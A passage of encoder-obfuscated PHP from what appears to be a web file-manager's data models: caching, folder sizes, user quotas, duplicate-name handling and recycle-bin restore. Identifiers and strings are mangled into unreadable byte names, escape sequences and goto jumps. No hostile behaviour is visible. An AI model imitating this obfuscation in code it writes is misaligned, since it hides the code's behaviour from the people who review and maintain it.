array($í»²¦ò²[83] => $‘î•å«, $í»²¦ò²[84] => $èÑáï§¡); } public function pathInfo($½†¡ú—Ú, $µÃ™¼ = false) { $ä¨ÆÍ =& $_SERVER[íïàËŸë]; $µÃ™¼ = !1; $½†¡ú—Ú = intval($½†¡ú—Ú); $–Š·¶ÌÒ = $ä¨ÆÍ[534] . intval($µÃ™¼) . $ä¨ÆÍ[462] . $½†¡ú—Ú; $ ª‡ãğÌ = _get(self::$cachePathInfo, $–Š·¶ÌÒ); if ($ ª‡ãğÌ) { return $ ª‡ãğÌ; } $Ï ·›´ = $this->sourceInfo($½†¡ú—Ú); if (!$Ï ·›´) { return !1; } $Ï ·›´ = $this->_listDataApplyItem($Ï ·›´, $µÃ™¼); self::$cachePathInfo[$–Š·¶ÌÒ] = $Ï ·›´; return $Ï ·›´; } public static $cachePathInfoMore = array(); public function pathInfoMore($Òç‘Ó–) { $¼›ƒÑİ  =& $_SERVER[íïàËŸë]; $¸Â”áöœ = _get(self::$cachePathInfoMore, $Òç‘Ó–); if ($¸Â”áöœ) { return $¸Â”áöœ; } $ôÑÎØ = $this->pathInfo($Òç‘Ó–); if (!$ôÑÎØ) { return !1; } if ($ôÑÎØ[$¼›ƒÑİ [485]] == $¼›ƒÑİ [91]) { $ôÑÎØ[$¼›ƒÑİ [82]] = $this->folderChildrenNumber($Òç‘Ó–); } self::$cachePathInfoMore[$Òç‘Ó–] = $ôÑÎØ; return $ôÑÎØ; } public function sourceInfo($ÌşæÜ¡¾) { $—ñÒœÜ =& $_SERVER[íïàËŸë]; if (!$ÌşæÜ¡¾) { return array(); } $ÌşæÜ¡¾ = intval($ÌşæÜ¡¾); $Úé‘‡¦‰ = $—ñÒœÜ[533] . $ÌşæÜ¡¾; $¥âÏ ‘ù = _get(self::$cacheSourceInfo, $Úé‘‡¦‰); if ($¥âÏ ‘ù) { return $¥âÏ ‘ù; } $şµ¦¬Äı = $this->where(array($—ñÒœÜ[193] => $ÌşæÜ¡¾))->find(); self::$cacheSourceInfo[$Úé‘‡¦‰] = $şµ¦¬Äı; return self::$cacheSourceInfo[$Úé‘‡¦‰]; } public function sourceCacheClear($íÜ¤Íí = false) { self::cacheClear($íÜ¤Íí); } public static function cacheClear($ùŸ‡íŞ = false) { $‘€ãªèï =& $_SERVER[íïàËŸë]; if ($ùŸ‡íŞ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$‘€ãªèï[533] . $ùŸ‡íŞ]); unset(self::$cachePathInfoMore[$ùŸ‡íŞ]); unset(self::$cachePathInfo[$‘€ãªèï[2289] . $ùŸ‡íŞ]); unset(self::$cachePathInfo[$‘€ãªèï[2290] . $ùŸ‡íŞ]); } public function metaSet($±éòıÚÏ, $ ®¦ß³» = null, $ù÷œÍåÓ = null) { $ ³à ®… = parent::metaSet($±éòıÚÏ, $ ®¦ß³», $ù÷œÍåÓ); if ($ ³à ®…) { $this->sourceCacheClear($±éòıÚÏ); } return $ ³à ®…; } public function pathInfoByPath($ßÑÎŞĞ, $¥’õåëÒ) { $”Ëò„× =& $_SERVER[íïàËŸë]; $‚Ğ÷Ğ™ü = !$¥’õåëÒ ? array() : explode($”Ëò„×[8], trim($¥’õåëÒ, $”Ëò„×[8])); $ ß˜¶» = $ßÑÎŞĞ; foreach ($‚Ğ÷Ğ™ü as $é¥‹›´‘) { $ª‘éŞ½ª = array($”Ëò„×[192] => $ ß˜¶», $”Ëò„×[32] => $é¥‹›´‘); $—ë«ê§ = $this->field($”Ëò„×[2291])->where($ª‘éŞ½ª)->select(); if (!$—ë«ê§) { return !1; } $—ë«ê§ = array_sort_by($—ë«ê§, $”Ëò„×[505]); $ ß˜¶» = $—ë«ê§[0][$”Ëò„×[193]]; } $ï¨Ô©êÓ = $this->sourceInfo($ ß˜¶»); $this->pathInfoFilter($ï¨Ô©êÓ); return $ï¨Ô©êÓ; } protected function updateModifyTime($·äÉ€š‡) { $ÜÁ“Ñ½ğ =& $_SERVER[íïàËŸë]; $ŸôÂî×í = defined($ÜÁ“Ñ½ğ[2206]) ? USER_ID : 0; if (!$·äÉ€š‡) { return; } if (!is_array($·äÉ€š‡)) { $·äÉ€š‡ = array($·äÉ€š‡); } foreach ($·äÉ€š‡ as $îƒ‘û»Õ => $Ö¼ÜÜÉõ) { $·äÉ€š‡[$îƒ‘û»Õ] = intval($Ö¼ÜÜÉõ); $this->sourceCacheClear($Ö¼ÜÜÉõ); } $á¡ÁÈ· = array($ÜÁ“Ñ½ğ[193] => array($ÜÁ“Ñ½ğ[7], $·äÉ€š‡)); $Ğşúİ´í = array($ÜÁ“Ñ½ğ[651] => $ŸôÂî×í, $ÜÁ“Ñ½ğ[498] => time()); $this->where($á¡ÁÈ·)->save($Ğşúİ´í); } public function folderSizeReset($¡¸†èÆ, $İËêÔîà = false) { $”ïìñ‘Ë =& $_SERVER[íïàËŸë]; if ($this->statusIgnoreResetSpace) { return; } $Ôèˆ“‰ = $this->sourceInfo($¡¸†èÆ); $èø³¤‰ = $”ïìñ‘Ë[2292] . $¡¸†èÆ; CacheLock::lock($èø³¤‰, 20); if ($İËêÔîà === !1) { $this->sourceCacheClear($¡¸†èÆ); $Ôèˆ“‰ = $this->sourceInfo($¡¸†èÆ); $ ˜ğÙ§Ü = array($”ïìñ‘Ë[477] => $¡¸†èÆ, $”ïìñ‘Ë[504] => 0); $äûÒÕö = $this->where($ ˜ğÙ§Ü)->sum($”ïìñ‘Ë[79]); $İËêÔîà = intval($äûÒÕö) - intval($Ôèˆ“‰[$”ïìñ‘Ë[79]]); } if ($İËêÔîà == 0) { return CacheLock::unlock($èø³¤‰); } $£½ÌéÔ = $this->parentLevelArray($Ôèˆ“‰[$”ïìñ‘Ë[584]]); if (!$£½ÌéÔ) { $£½ÌéÔ = array(); } $£½ÌéÔ[] = $Ôèˆ“‰[$”ïìñ‘Ë[193]]; $ ˜ğÙ§Ü = array($”ïìñ‘Ë[193] => array($”ïìñ‘Ë[492], $£½ÌéÔ)); if ($İËêÔîà < 0) { $ ˜ğÙ§Ü[$”ïìñ‘Ë[79]] = array($”ïìñ‘Ë[1104], abs($İËêÔîà)); } $this->where($ ˜ğÙ§Ü)->setAdd($”ïìñ‘Ë[79], $İËêÔîà); CacheLock::unlock($èø³¤‰); $ÎÔäİ–Ÿ = $”ïìñ‘Ë[2293] . $Ôèˆ“‰[$”ïìñ‘Ë[190]] . $”ïìñ‘Ë[4] . $Ôèˆ“‰[$”ïìñ‘Ë[569]]; $¼Å“„ìæ = array($Ôèˆ“‰[$”ïìñ‘Ë[190]], $Ôèˆ“‰[$”ïìñ‘Ë[569]]); TaskRun::timeLimitCall($ÎÔäİ–Ÿ, $”ïìñ‘Ë[2294], $¼Å“„ìæ, 1.5); } public function folderSizeResetChildren($µš »ò) { $Õë­Î½ñ =& $_SERVER[íïàËŸë]; $this->sourceCacheClear($µš »ò); $•ÎÀ¬êÛ = $this->sourceInfo($µš »ò); $¶ıê”§ç = array($Õë­Î½ñ[646] => 1, $Õë­Î½ñ[649] => $•ÎÀ¬êÛ[$Õë­Î½ñ[569]], $Õë­Î½ñ[652] => array($Õë­Î½ñ[612], $•ÎÀ¬êÛ[$Õë­Î½ñ[584]] . $µš »ò . $Õë­Î½ñ[613])); $—Íòïìª = $Õë­Î½ñ[2295]; $«áÑ˜·  = $this->field($—Íòïìª)->where($¶ıê”§ç)->select(); $¶ıê”§ç[$Õë­Î½ñ[485]] = 0; $²»¾È = $this->field($—Íòïìª)->where($¶ıê”§ç)->select(); if (!$²»¾È) { return; } $«áÑ˜· [] = $•ÎÀ¬êÛ; $«áÑ˜·  = array_to_keyvalue($«áÑ˜· , $Õë­Î½ñ[193]); foreach ($«áÑ˜·  as $£•ûØŒ¿ => $¼…ä˜úÌ) { $«áÑ˜· [$£•ûØŒ¿][$Õë­Î½ñ[2296]] = $«áÑ˜· [$£•ûØŒ¿][$Õë­Î½ñ[79]]; $«áÑ˜· [$£•ûØŒ¿][$Õë­Î½ñ[79]] = 0; } foreach ($²»¾È as $¼…ä˜úÌ) { $¬öØ³Á± = $¼…ä˜úÌ[$Õë­Î½ñ[192]] . $Õë­Î½ñ[12]; if (!isset($«áÑ˜· [$¬öØ³Á±])) { continue; } if ($¼…ä˜úÌ[$Õë­Î½ñ[505]] == $«áÑ˜· [$¬öØ³Á±][$Õë­Î½ñ[505]]) { $«áÑ˜· [$¬öØ³Á±][$Õë­Î½ñ[79]] += $¼…ä˜úÌ[$Õë­Î½ñ[79]]; } } foreach ($«áÑ˜·  as $¼…ä˜úÌ) { $°ŞŸÕª‹ = $this->parentLevelArray($¼…ä˜úÌ[$Õë­Î½ñ[584]]); foreach ($°ŞŸÕª‹ as $¬öØ³Á±) { $¬öØ³Á± = $¬öØ³Á± . $Õë­Î½ñ[12]; if (!isset($«áÑ˜· [$¬öØ³Á±])) { continue; } if ($¼…ä˜úÌ[$Õë­Î½ñ[505]] == $«áÑ˜· [$¬öØ³Á±][$Õë­Î½ñ[505]]) { $«áÑ˜· [$¬öØ³Á±][$Õë­Î½ñ[79]] += $¼…ä˜úÌ[$Õë­Î½ñ[79]]; } } } $ø÷ÍòÜ = array(); foreach ($«áÑ˜·  as $¼…ä˜úÌ) { if ($¼…ä˜úÌ[$Õë­Î½ñ[79]] == $¼…ä˜úÌ[$Õë­Î½ñ[2296]]) { continue; } $ø÷ÍòÜ[] = array($Õë­Î½ñ[193], $¼…ä˜úÌ[$Õë­Î½ñ[193]], $Õë­Î½ñ[79], $¼…ä˜úÌ[$Õë­Î½ñ[79]]); } $this->saveAll($ø÷ÍòÜ); } public function userSpaceReset($©…¹„ó = false) { $­á˜‡§° =& $_SERVER[íïàËŸë]; $Ü¦û¹«Å = $this->where(array($­á˜‡§°[190] => self::TYPE_USER, $­á˜‡§°[569] => $©…¹„ó, $­á˜‡§°[485] => 0))->sum($­á˜‡§°[79]); $Ü¦û¹«Å = !$Ü¦û¹«Å || $Ü¦û¹«Å <= 0 ? 0 : $Ü¦û¹«Å; Model($­á˜‡§°[577])->userEdit($©…¹„ó, array($­á˜‡§°[1969] => $Ü¦û¹«Å)); } public function targetSpaceUpdate($õˆÉ‘®±, $Ó…ÏĞÜŒ) { $£·ş† =& $_SERVER[íïàËŸë]; if (!$Ó…ÏĞÜŒ) { return; } if (!in_array($õˆÉ‘®±, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $…ª‰åîÛ = $this->targetSpaceSize($õˆÉ‘®±, $Ó…ÏĞÜŒ); if ($õˆÉ‘®± == self::TYPE_USER) { Model($£·ş†[577])->userEdit($Ó…ÏĞÜŒ, array($£·ş†[1969] => $…ª‰åîÛ)); } else { if ($õˆÉ‘®± == self::TYPE_GROUP) { Model($£·ş†[585])->groupEdit($Ó…ÏĞÜŒ, array($£·ş†[1969] => $…ª‰åîÛ)); } } } public function targetSpaceSize($§è³ííÔ, $¬­ÇÖªí) { $…º—æè» =& $_SERVER[íïàËŸë]; $ä‚§è· = 0; $çäˆÎİ° = $this->targetSourceRoot($§è³ííÔ, $¬­ÇÖªí, !0); foreach ($çäˆÎİ° as $ò¦ê½¨Š) { if (!$ò¦ê½¨Š) { continue; } $ä‚§è· += floatval($ò¦ê½¨Š[$…º—æè»[79]]); $óÑüçà‰ = array($…º—æè»[652] => array($…º—æè»[612], $…º—æè»[594] . $ò¦ê½¨Š[$…º—æè»[193]] . $…º—æè»[613])); $Ê«†Ì™õ = Model($…º—æè»[503])->field($…º—æè»[491])->where($óÑüçà‰)->select(); $Ê«†Ì™õ = array_to_keyvalue($Ê«†Ì™õ, $…º—æè»[12], $…º—æè»[193]); $Ê«†Ì™õ = array_unique(array_filter($Ê«†Ì™õ)); if ($Ê«†Ì™õ) { $óÑüçà‰ = array($…º—æè»[491] => array($…º—æè»[492], $Ê«†Ì™õ)); $ä‚§è· += floatval($this->where($óÑüçà‰)->sum($…º—æè»[79])); } } $ä‚§è· = !$ä‚§è· || $ä‚§è· <= 0 ? 0 : $ä‚§è·; return $ä‚§è·; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($Ü‡Ç¦æğ) { return $this->fileTypeProfile($Ü‡Ç¦æğ, SourceModel::TYPE_USER); } public function groupFileTypeProfile($Ìîˆ‡Ò›) { return $this->fileTypeProfile($Ìîˆ‡Ò›, SourceModel::TYPE_GROUP); } private function fileTypeProfile($¸øÎÚÓè, $®†ëíØ) { $¾¸Ğ’½œ =& $_SERVER[íïàËŸë]; $Ì¦‚ÙÛÜ = $¾¸Ğ’½œ[2297] . $¸øÎÚÓè . $¾¸Ğ’½œ[11] . $®†ëíØ; $ĞÔç‰Õ  = Cache::get($Ì¦‚ÙÛÜ); if ($ĞÔç‰Õ ) { return $ĞÔç‰Õ ; } $œˆĞ¾ì = array($¾¸Ğ’½œ[646] => 0); if ($¸øÎÚÓè != !1) { $œˆĞ¾ì[$¾¸Ğ’½œ[569]] = $¸øÎÚÓè; $œˆĞ¾ì[$¾¸Ğ’½œ[190]] = $®†ëíØ; } $ƒ–ãİê = array(); $ƒ–ãİê[$¾¸Ğ’½œ[2298]] = array($¾¸Ğ’½œ[2299] => LNG($¾¸Ğ’½œ[2298]), $¾¸Ğ’½œ[2300] => $this->where($œˆĞ¾ì)->count(), $¾¸Ğ’½œ[617] => $this->where($œˆĞ¾ì)->sum($¾¸Ğ’½œ[79])); $Ç¿õ°Ôë = KodIO::fileTypeList(); foreach ($Ç¿õ°Ôë as $×§İ¶— => $•ğ×£…¢) { $œˆĞ¾ì[$¾¸Ğ’½œ[486]] = $this->fileTypeWhere($×§İ¶—); $ƒ–ãİê[$×§İ¶—] = array($¾¸Ğ’½œ[2299] => $•ğ×£…¢[$¾¸Ğ’½œ[32]], $¾¸Ğ’½œ[2300] => $this->where($œˆĞ¾ì)->count(), $¾¸Ğ’½œ[617] => $this->where($œˆĞ¾ì)->sum($¾¸Ğ’½œ[79])); } Cache::set($Ì¦‚ÙÛÜ, $ƒ–ãİê, 1200); return $ƒ–ãİê; } public function fileNameExist($À•Âä«õ, $‘ÆÚê¨Ö) { $²´È³‹„ =& $_SERVER[íïàËŸë]; $ãúÊ¬šÄ = $this->field($²´È³‹„[2301])->where(array($²´È³‹„[192] => $À•Âä«õ, $²´È³‹„[32] => $‘ÆÚê¨Ö, $²´È³‹„[505] => 0))->find(); return is_array($ãúÊ¬šÄ) ? $ãúÊ¬šÄ[$²´È³‹„[193]] : !1; } public function childList($†¶…ÖË½) { $§ª²‹÷ =& $_SERVER[íïàËŸë]; $Ø—Ğú·® = $§ª²‹÷[2274] . $†¶…ÖË½; if (isset(self::$cacheChildList[$Ø—Ğú·®])) { return self::$cacheChildList[$Ø—Ğú·®]; } $ğ¤Ü„Ò = array($§ª²‹÷[192] => intval($†¶…ÖË½), $§ª²‹÷[505] => 0); $‡šß˜‚· = $this->where($ğ¤Ü„Ò)->select(); $‡šß˜‚· = $‡šß˜‚· ? $‡šß˜‚· : array(); self::$cacheChildList[$Ø—Ğú·®] = $‡šß˜‚·; foreach ($‡šß˜‚· as $ƒ»ó—Ó¡) { $Ø—Ğú·® = $§ª²‹÷[533] . $ƒ»ó—Ó¡[$§ª²‹÷[193]]; self::$cacheSourceInfo[$Ø—Ğú·®] = $ƒ»ó—Ó¡; } return $‡šß˜‚·; } public function fileNameAuto($˜é‹ƒ²€, $¦­É¯ÖĞ, $ÏÆí£›¸ = REPEAT_RENAME, $„‹ñçº = false) { $ßÊ©ñ× =& $_SERVER[íïàËŸë]; $å ¥Ìë™ = get_path_ext($¦­É¯ÖĞ); $ùş£ˆÛË = $å ¥Ìë™ ? get_path_ext_name($¦­É¯ÖĞ) . $ßÊ©ñ×[2302] . $å ¥Ìë™ : $¦­É¯ÖĞ . $ßÊ©ñ×[460]; $²¨×ş© = array($ßÊ©ñ×[192] => $˜é‹ƒ²€, $ßÊ©ñ×[505] => 0, $ßÊ©ñ×[32] => array($ßÊ©ñ×[459], $ùş£ˆÛË)); $¸êÓ±¿Ô = $this->field($ßÊ©ñ×[32])->where($²¨×ş©)->select(); $Àê“Ã÷ = array_to_keyvalue($¸êÓ±¿Ô, $ßÊ©ñ×[12], $ßÊ©ñ×[32]); return $this->fileNameAutoGet($Àê“Ã÷, $¦­É¯ÖĞ, $ÏÆí£›¸, $„‹ñçº); } public function fileNameAutoGet($«²ÜÛí§, $À•±³´, $Š½óşı, $Ìß‹Ğß) { $é³Ï÷ÌÃ =& $_SERVER[íïàËŸë]; if ($Š½óşı == REPEAT_REPLACE || !$«²ÜÛí§ || !in_array_not_case($À•±³´, $«²ÜÛí§) || $Ìß‹Ğß && $Š½óşı != REPEAT_RENAME_FOLDER) { return $À•±³´; } if ($Š½óşı == REPEAT_SKIP) { return !1; } $–öè´Ğ = $é³Ï÷ÌÃ[10] . get_path_ext($À•±³´); $–öè´Ğ = $–öè´Ğ == $é³Ï÷ÌÃ[10] || $Ìß‹Ğß ? $é³Ï÷ÌÃ[12] : $–öè´Ğ; for ($î÷Ü˜ñÉ = 1; $î÷Ü˜ñÉ <= count($«²ÜÛí§) + 1; $î÷Ü˜ñÉ++) { $áûœ·ä· = substr($À•±³´, 0, strlen($À•±³´) - strlen($–öè´Ğ)); $Í‰ßï÷ù = $áûœ·ä· . "\50{$î÷Ü˜ñÉ}\x29{$–öè´Ğ}"; if (!in_array_not_case($Í‰ßï÷ù, $«²ÜÛí§)) { return $Í‰ßï÷ù; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\137\163\157\165\x72\x63\145\x5f\162\x65\x63\171\x63\154\x65"; protected $dataAuto = array(array("\143\162\145\141\164\x65\x54\x69\x6d\x65", "\x74\151\155\145", "\151\x6e\163\x65\162\x74", "\146\x75\x6e\143\164\x69\157\156")); public function listData($»½Å “­ = false) { $™›¸œÃã =& $_SERVER[íïàËŸë]; $»½Å “­ = $»½Å “­ ? $»½Å “­ : USER_ID; $Îˆ˜î¢ = $this->where(array($™›¸œÃã[1773] => $»½Å “­))->select(); return array_to_keyvalue($Îˆ˜î¢, $™›¸œÃã[12], $™›¸œÃã[193]); } public function moveToRecycle($—‹Òß‡ƒ) { $Şì—‰ˆğ =& $_SERVER[íïàËŸë]; $Ëòä¨² = Model($Şì—‰ˆğ[1428]); $•ğ¡ªıœ = $Ëòä¨²->sourceInfo($—‹Òß‡ƒ); if (!$•ğ¡ªıœ || $•ğ¡ªıœ[$Şì—‰ˆğ[505]] == $Şì—‰ˆğ[91]) { return; } $…ò©ë†Ã = array($Şì—‰ˆğ[491] => $—‹Òß‡ƒ, $Şì—‰ˆğ[1773] => USER_ID, $Şì—‰ˆğ[648] => $•ğ¡ªıœ[$Şì—‰ˆğ[190]], $Şì—‰ˆğ[649] => $•ğ¡ªıœ[$Şì—‰ˆğ[569]], $Şì—‰ˆğ[652] => $•ğ¡ªıœ[$Şì—‰ˆğ[584]]); $this->add($…ò©ë†Ã); $this->recycleMove($—‹Òß‡ƒ, 1); if ($•ğ¡ªıœ[$Şì—‰ˆğ[485]] == $Şì—‰ˆğ[91]) { $ÕÑ‘èı = array($Şì—‰ˆğ[652] => array($Şì—‰ˆğ[612], $•ğ¡ªıœ[$Şì—‰ˆğ[584]] . $—‹Òß‡ƒ . $Şì—‰ˆğ[613])); $Ëòä¨²->where($ÕÑ‘èı)->setField($Şì—‰ˆğ[505], 1); } } public function clear() { $this->remove(!1); } public function remove($†ğƒ©ËÆ = false, $¸¸øÎ¥ = false) { $êÎÆ¦™ˆ =& $_SERVER[íïàËŸë]; $¸¸øÎ¥ = $¸¸øÎ¥ ? $¸¸øÎ¥ : USER_ID; $ØÁáâ›± = Model($êÎÆ¦™ˆ[1428]); $àığ½¢í = $this->listData($¸¸øÎ¥); $†ğƒ©ËÆ = $†ğƒ©ËÆ === !1 ? !1 : $†ğƒ©ËÆ; $¼üîŞ  = array(); foreach ($àığ½¢í as $†¢Á²£Ú) { if ($†ğƒ©ËÆ != !1 && !in_array($†¢Á²£Ú, $†ğƒ©ËÆ)) { continue; } $ñà¸²© = $ØÁáâ›±->sourceInfo($†¢Á²£Ú); $ØÁáâ›±->remove($†¢Á²£Ú, !1); $“³îñ›ª = $ñà¸²©[$êÎÆ¦™ˆ[190]] . $êÎÆ¦™ˆ[11] . $ñà¸²©[$êÎÆ¦™ˆ[569]]; $¼üîŞ [$“³îñ›ª] = array($êÎÆ¦™ˆ[648] => $ñà¸²©[$êÎÆ¦™ˆ[190]], $êÎÆ¦™ˆ[569] => $ñà¸²©[$êÎÆ¦™ˆ[569]]); $this->where(array($êÎÆ¦™ˆ[193] => $†¢Á²£Ú))->delete(); } foreach ($¼üîŞ  as $Ô°Õ®Åæ) { $ØÁáâ›±->targetSpaceUpdate($Ô°Õ®Åæ[$êÎÆ¦™ˆ[190]], $Ô°Õ®Åæ[$êÎÆ¦™ˆ[569]]); } } public function restore($ÎïÌ»ù¬ = false) { $¸¬ÇÂßä = $this->listData(); $this->_restoreSource($¸¬ÇÂßä, $ÎïÌ»ù¬); } public function removeUserAll($“­¥Ãğ›) { $this->remove(!1, $“­¥Ãğ›); } public function restoreItem($İŸş‰Ÿ) { $this->_restoreSource(array($İŸş‰Ÿ), array($İŸş‰Ÿ)); } private function _restoreSource($•Ê“¡åô, $¡ÉÍƒ) { $±Ò°Ü =& $_SERVER[íïàËŸë]; $Ò«¹ˆŒ« = Model($±Ò°Ü[1428]); $¡ÉÍƒ = $¡ÉÍƒ == !1 ? !1 : $¡ÉÍƒ; if (!$•Ê“¡åô) { return !0; } $å„Öï…º = array(); foreach ($•Ê“¡åô as $¼›× ¤¼) { if ($¡ÉÍƒ != !1 && !in_array($¼›× ¤¼, $¡ÉÍƒ)) { continue; } $ñÚÂÅ° = $Ò«¹ˆŒ«->sourceInfo($¼›× ¤¼); $¢£“ÅÍå = $Ò«¹ˆŒ«->sourceInfo($ñÚÂÅ°[$±Ò°Ü[192]]); if ($¢£“ÅÍå[$±Ò°Ü[505]] == $±Ò°Ü[91]) { continue; } $Ò«¹ˆŒ«->lockMoveStart($¼›× ¤¼); $this->recycleMove($¼›× ¤¼, 0); if ($ñÚÂÅ°[$±Ò°Ü[485]] == $±Ò°Ü[91]) { $¿€İ§Ã¶ = array($±Ò°Ü[652] => array($±Ò°Ü[612], $ñÚÂÅ°[$±Ò°Ü[584]] . $¼›× ¤¼ . $±Ò°Ü[613])); $Ò«¹ˆŒ«->where($¿€İ§Ã¶)->setField($±Ò°Ü[505], 0); $this->restoreFolderChildren($¼›× ¤¼, $•Ê“¡åô); } $this->where(array($±Ò°Ü[193] => $¼›× ¤¼))->delete(); $Ò«¹ˆŒ«->folderSizeReset($ñÚÂÅ°[$±Ò°Ü[192]]); $å„Öï…º[] = $ñÚÂÅ°[$±Ò°Ü[192]]; if ($ñÚÂÅ°[$±Ò°Ü[485]] == $±Ò°Ü[91]) { $å„Öï…º[] = $¼›× ¤¼; } $Ò«¹ˆŒ«->lockMoveEnd($¼›× ¤¼); } $Ò«¹ˆŒ«->updateModifyTime($å„Öï…º); } private function restoreFolderChildren($»Ãıšì, $¸ÏÎÄÖô) { $‚–Ÿ•– =& $_SERVER[íïàËŸë]; $¶Ó®öğ® = Model($‚–Ÿ•–[1428]); $–Âüœµ = array($‚–Ÿ•–[193] => array($‚–Ÿ•–[7], array())); foreach ($¸ÏÎÄÖô as $Æ€‚Ãî) { if ($Æ€‚Ãî == $»Ãıšì) { continue; } if (!$¶Ó®öğ®->isParentOf($»Ãıšì, $Æ€‚Ãî)) { continue; } $¡Ì­®« = $¶Ó®öğ®->sourceInfo($Æ€‚Ãî); if ($¡Ì­®«[$‚–Ÿ•–[485]] == $‚–Ÿ•–[91]) { $–Âüœµ[] = array($‚–Ÿ•–[652] => array($‚–Ÿ•–[612], $¡Ì­®«[$‚–Ÿ•–[584]] . $Æ€‚Ãî . $‚–Ÿ•–[613])); } else { $–Âüœµ[$‚–Ÿ•–[193]][1][] = $Æ€‚Ãî; } } if (!$–Âüœµ[$‚–Ÿ•–[193]][1]) { unset($–Âüœµ[$‚–Ÿ•–[193]]); } if (!$–Âüœµ) { return; } if (is_array($–Âüœµ[$‚–Ÿ•–[193]]) && is_array($–Âüœµ[$‚–Ÿ•–[193]][1])) { $–Âüœµ[$‚–Ÿ•–[193]][1] = array_unique($–Âüœµ[$‚–Ÿ•–[193]][1]); } $–Âüœµ[$‚–Ÿ•–[1089]] = $‚–Ÿ•–[2082]; $¶Ó®öğ®->where($–Âüœµ)->setField($‚–Ÿ•–[505], 1); } private function recycleMove($Ïªæš±Ã, $Ÿ÷·ÛÚÃ = 1) { $ÇğúçÑ¸ =& $_SERVER[íïàËŸë]; $çïú¹Òş = Model($ÇğúçÑ¸[1428]); $¯õ ÖŠã = Model($ÇğúçÑ¸[2303]); $§Î‹ßÅş = array($ÇğúçÑ¸[193] => $Ïªæš±Ã); if ($Ÿ÷·ÛÚÃ) { $çïú¹Òş->where($§Î‹ßÅş)->setField($ÇğúçÑ¸[505], 1); $¯õ ÖŠã->eventRecycle($Ïªæš±Ã, $ÇğúçÑ¸[2304]); } else { $Í¡³Îİ¶ = $çïú¹Òş->where($§Î‹ßÅş)->find(); $É»Œ÷°£ = $Í¡³Îİ¶[$ÇğúçÑ¸[485]] == $ÇğúçÑ¸[91]; $ªÃÌº¯ª = $çïú¹Òş->fileNameAuto($Í¡³Îİ¶[$ÇğúçÑ¸[192]], $Í¡³Îİ¶[$ÇğúçÑ¸[32]], REPEAT_RENAME_FOLDER, $É»Œ÷°£); if ($ªÃÌº¯ª != $Í¡³Îİ¶[$ÇğúçÑ¸[32]]) { $çïú¹Òş->rename($Ïªæš±Ã, $ªÃÌº¯ª); } $çïú¹Òş->where($§Î‹ßÅş)->setField($ÇğúçÑ¸[505], 0); $¯õ ÖŠã->eventRecycle($Ïªæš±Ã, $ÇğúçÑ¸[2305]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\163\157\x75\162\143\x65\123\145\x63\x72\x65\x74\114\151\163\x74"; public $field = array("\163\x6f\x75\162\x63\145\x49\x44", "\164\171\160\145\111\104", "\143\x72\x65\141\164\145\125\163\x65\x72"); } goto bùÀ½’¿®‰; bäñˆ¹õ›Î: define($_SERVER[íïàËŸë][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\x6c\x65", "\157\162\144\145\162", "\141\x6c\x69\x61\163", "\x68\x61\x76\151\156\147", "\x67\162\x6f\165\x70", "\x6c\157\x63\x6b", "\x64\x69\x73\x74\151\156\143\x74", "\x61\165\x74\x6f", "\x66\x69\x6c\164\x65\x72", "\x76\x61\154\151\x64\x61\x74\145", "\162\x65\163\x75\154\164", "\142\x69\156\144", "\x74\157\x6b\x65\x6e"); public function __construct($âí“ášá = '', $¶¨¥èáÒ = '', $Â›¥è· = '') { $¸º’«ÉÔ =& $_SERVER[íïàËŸë]; $this->_initialize(); if (!empty($âí“ášá)) { if (strpos($âí“ášá, $¸º’«ÉÔ[10])) { list($this->dbName, $this->name) = explode($¸º’«ÉÔ[10], $âí“ášá); } else { $this->name = $âí“ášá; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($¶¨¥èáÒ)) { $this->tablePrefix = $¸º’«ÉÔ[12]; } elseif ($¸º’«ÉÔ[12] != $¶¨¥èáÒ) { $this->tablePrefix = $¶¨¥èáÒ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($¸º’«ÉÔ[321]); } $this->db(0, empty($this->connection) ? $Â›¥è· : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $–À•å =& $_SERVER[íïàËŸë]; if (empty($this->fields)) { if (think_config($–À•å[322])) { $¤ÃÉ°Ëô = $this->dbName ? $this->dbName : think_config($–À•å[323]); $­Î¥Ë¤Ã = think_var_cache($–À•å[324] . strtolower(get_path_this($¤ÃÉ°Ëô) . $–À•å[10] . $this->name)); if ($­Î¥Ë¤Ã) { $ËÉ»¯º¹ = think_config($–À•å[325]); if (empty($ËÉ»¯º¹) || $­Î¥Ë¤Ã[$–À•å[326]] == $ËÉ»¯º¹) { $this->fields = $­Î¥Ë¤Ã; return; } } } $this->flush(); } } public function flush() { $óùÈÀŞŠ =& $_SERVER[íïàËŸë]; $this->db->setModel($this->name); $“ò»ØÁà = $this->db->getFields($this->getTableName()); if (!$“ò»ØÁà) { return !1; } $this->fields = array_keys($“ò»ØÁà); $this->fields[$óùÈÀŞŠ[327]] = !1; foreach ($“ò»ØÁà as $§Ä¦ó©í => $ŒĞ“Ì‡À) { $ïŸÖßÔò[$§Ä¦ó©í] = $ŒĞ“Ì‡À[$óùÈÀŞŠ[33]]; if ($ŒĞ“Ì‡À[$óùÈÀŞŠ[39]]) { $this->fields[$óùÈÀŞŠ[328]] = $§Ä¦ó©í; if ($ŒĞ“Ì‡À[$óùÈÀŞŠ[42]]) { $this->fields[$óùÈÀŞŠ[327]] = !0; } } } $this->fields[$óùÈÀŞŠ[329]] = $ïŸÖßÔò; if (think_config($óùÈÀŞŠ[325])) { $this->fields[$óùÈÀŞŠ[326]] = think_config($óùÈÀŞŠ[325]); } if 